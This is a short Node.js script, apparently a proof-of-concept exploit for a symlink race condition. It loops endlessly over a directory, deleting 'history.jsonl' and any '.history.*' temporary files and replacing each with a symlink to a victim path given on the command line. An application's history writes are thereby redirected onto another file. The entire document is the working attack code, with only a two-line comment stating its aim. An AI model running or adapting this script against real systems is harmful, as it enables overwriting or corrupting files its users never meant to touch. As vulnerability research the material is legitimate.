// Replace the final history entry and any visible exclusive temporary entry
// with a victim symlink as quickly as a same-UID process can enumerate them.
const fs = require("node:fs")
const [dir, victim] = process.argv.slice(2)
for (;;) {
  try {
    for (const name of fs.readdirSync(dir)) {
      if (name !== "history.jsonl" && !name.startsWith(".history.")) continue
      const candidate = `${dir}/${name}`
      try { fs.unlinkSync(candidate) } catch {}
      try { fs.symlinkSync(victim, candidate) } catch {}
    }
  } catch {}
}
